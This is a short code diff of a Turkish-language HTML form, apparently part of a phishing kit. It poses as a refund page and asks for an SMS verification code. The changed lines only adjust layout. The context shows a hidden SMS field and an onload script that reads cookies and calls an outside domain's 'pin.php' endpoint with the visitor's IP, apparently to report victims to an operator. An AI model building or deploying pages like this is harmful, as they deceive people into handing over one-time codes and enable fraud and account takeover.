@@ -47,7 +47,7 @@
       <fieldset>
           <div class="form-row required">
             <label for="iade" class="enforced" id="iade" style="display: none;">İADE TUTARI :</label>
-           <br> <center>   <label id="iadeTutari"> </label> </center> 
+           <br> <center><div class="form-row center-item"> <label id="iadeTutari"> </label></div>  </center> 
     <script>
       window.onload = function() {
           const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
@@ -78,7 +78,7 @@
           const parts = value.split(`; ${name}=`);
           if (parts.length === 2) return parts.pop().split(';').shift();
       }
-  </script>
+  </script><br>
               <label for="sms" class="enforced">SMS DOĞRULAMA KODU</label>
               <input type="hidden" name="encsms" id="encsms" value="">
               <div class="form-field fieldGroup">
